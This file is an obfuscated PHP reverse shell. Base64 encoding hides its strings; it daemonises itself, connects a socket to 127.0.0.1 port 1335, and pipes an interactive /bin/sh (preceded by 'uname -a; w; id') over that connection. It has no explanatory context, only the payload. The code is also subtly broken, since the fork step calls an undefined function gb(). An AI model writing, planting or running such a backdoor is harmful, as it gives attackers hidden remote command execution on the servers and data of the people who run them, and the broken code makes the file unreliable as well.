<?php set_time_limit(0);$f1=base64_decode('MS4w');$t2=base64_decode('MTI3LjAuMC4x');$r3=1335;$j4=1400;$x5=null;$j6=null;$f7=base64_decode('dW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1p');$h8=0;$q9=0;if(function_exists(base64_decode('cGNudGxfZm9yaw=='))){$ta=gb();if($ta==-1){o0(base64_decode('RVJST1I6IENhbid0IGZvcms='));exit(1);}if($ta){exit(0);}if(posix_setsid()==-1){o0(base64_decode('RXJyb3I6IENhbid0IHNldHNpZCgp'));exit(1);}$h8=1;}else{o0(base64_decode('V0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwu'));}chdir(base64_decode('Lw=='));umask(0);$ac=fsockopen($t2,$r3,$wd,$le,30);if(!$ac){o0("$le ($wd)");exit(1);}$df=array(0=>array(base64_decode('cGlwZQ=='),base64_decode('cg==')),1=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')),2=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')));$o10=proc_open($f7,$df,$l11);if(!is_resource($o10)){o0(base64_decode('RVJST1I6IENhbid0IA=='));exit(1);}stream_set_blocking($l11[0],0);stream_set_blocking($l11[1],0);stream_set_blocking($l11[2],0);stream_set_blocking($ac,0);o0(base64_decode('U3VjY2Vzc2Z1bGx5'));while(1){if(feof($ac)){o0(base64_decode('RVJST1I6IA=='));break;}if(feof($l11[1])){o0(base64_decode('RVJST1I6IGQ='));break;}$m12=array($ac,$l11[1],$l11[2]);$k13=stream_select($m12,$x5,$j6,null);if(in_array($ac,$m12)){if($q9)o0(base64_decode('U09DSyBSRUFE'));$w14=fread($ac,$j4);if($q9)o0("SOCK: $w14");fwrite($l11[0],$w14);}if(in_array($l11[1],$m12)){if($q9)o0(base64_decode('U1RET1VUIFJFQUQ='));$w14=fread($l11[1],$j4);if($q9)o0("STDOUT: $w14");fwrite($ac,$w14);}if(in_array($l11[2],$m12)){if($q9)o0(base64_decode('U1RERVJSIFJFQUQ='));$w14=fread($l11[2],$j4);if($q9)o0("STDERR: $w14");fwrite($ac,$w14);}}fclose($ac);fclose($l11[0]);fclose($l11[1]);fclose($l11[2]);proc_close($o10);function o0($i15){if(!$h8){print"$i15\n";}}?>
